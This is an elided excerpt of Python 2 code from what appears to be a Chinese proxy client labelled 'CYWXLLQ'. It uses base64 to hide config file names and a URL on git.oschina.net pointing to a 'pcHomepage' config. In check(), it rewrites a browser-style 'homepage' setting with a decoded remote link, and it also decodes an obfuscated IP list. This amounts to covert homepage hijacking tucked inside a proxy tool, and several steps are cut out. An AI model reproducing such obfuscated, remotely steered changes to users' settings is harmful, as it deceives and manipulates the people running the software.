...
class selfDecode(object):
    ...
    def check(self):
        ...
        try:
            ...
            info=patternF.sub('"homepage": "'+base64.decodestring(config.get('values', 'startup_urls_link'))+'"',info)
    ...
    def updateConfig(self):
        config = ConfigParser.ConfigParser()
        config.read([base64.decodestring('Y29uZmln')])
        link = base64.decodestring('aHR0cDovL2dpdC5vc2NoaW5hLm5ldC9jaGFuZ3lvdXd1eGlhbi9wY0hvbWVwYWdlL3Jhdy9tYXN0ZXIvY29uZmlnXzE=')
        try:
...
class Common(object):
    ...
    def __init__(self):
        ...
        self.CONFIG_CONFIGYUN_FILENAME = base64.decodestring('Q29uZmlnWXVu')
        self.CONFIG.read([self.CONFIG_FILENAME, self.CONFIG_ACCUNT_FILENAME, self.CONFIG_CONFIGYUN_FILENAME])
        ...
        local = 0
        try:
            local = len(self.CONFIG.get('iplistlocal', 'google_hk'))>10
            self.LISTEN_VISIBLE = self.CONFIG.getint('listen', 'visible')
        except Exception as e:
            self.LISTEN_VISIBLE = 1
            print '\n'
            print '\u672a\u68c0\u6d4b\u5230\u4e91\u52a0\u901f\u7f13\u5b58\uff0c\u8bf7\u624b\u52a8\u5f00\u542f\u4e91\u52a0\u901f'.encode('utf8').decode('unicode-escape')
            print '\n'

        if local:
            self.IPLIST_ALIAS = collections.OrderedDict((k, v.split('|')) for k, v in self.CONFIG.items('iplistlocal'))
        else:
            self.IPLIST_ALIAS = decoder.ipDecode(collections.OrderedDict((k, v.split('|')) for k, v in self.CONFIG.items('iplist')))
...
def pre_start():
    if sys.platform == 'cygwin':
        ...
        import ctypes
        ctypes.windll.kernel32.SetConsoleTitleW(u'CYWXLLQ %s' % __version__)
